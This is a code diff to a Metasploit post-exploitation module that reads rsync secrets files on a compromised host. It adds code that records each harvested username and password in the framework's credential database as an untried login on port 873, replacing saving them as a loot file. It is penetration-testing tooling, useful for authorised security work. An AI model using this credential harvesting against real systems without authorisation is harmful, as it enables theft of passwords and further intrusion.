@@ -60,6 +60,7 @@ class Metasploit3 < Msf::Post
         next if line =~ /^#/
         if /^(?<user>[^:]+):(?<password>.*)$/ =~ line
           creds_table << [ user, password, rmodule ]
+          report_rsync_cred(user, password, rmodule)
         end
       end
     end
@@ -67,14 +68,37 @@ class Metasploit3 < Msf::Post
     return if creds_table.rows.empty?
 
     print_line(creds_table.to_s)
-    store_loot(
-      "rsync.creds",
-      "text/csv",
-      session,
-      creds_table.to_csv,
-      "rsync_credentials.txt",
-      "RSYNC credentials from #{config_file}"
-    )
+  end
+
+  def report_rsync_cred(user, password, rmodule)
+    credential_data = {
+      origin_type: :session,
+      session_id: session_db_id,
+      post_reference_name: refname,
+      username: user,
+      private_data: password,
+      private_type: :password,
+      realm_value: rmodule,
+      # XXX: add to MDM?
+      #realm_key: Metasploit::Model::Realm::Key::RSYNC_MODULE,
+      workspace_id: myworkspace_id
+    }
+    credential_core = create_credential(credential_data)
+
+    login_data = {
+      address: session.session_host,
+      # TODO: rsync is 99.9% of the time on 873/TCP, but can be configured differently with the
+      # 'port' directive in the global part of the rsyncd configuration file.
+      # Unfortunately, Rex::Parser::Ini does not support parsing this just yet
+      port: 873,
+      protocol: "tcp",
+      service_name: "rsync",
+      core: credential_core,
+      access_level: "User",
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      workspace_id: myworkspace_id
+    }
+    create_credential_login(login_data)
   end
 
   def run
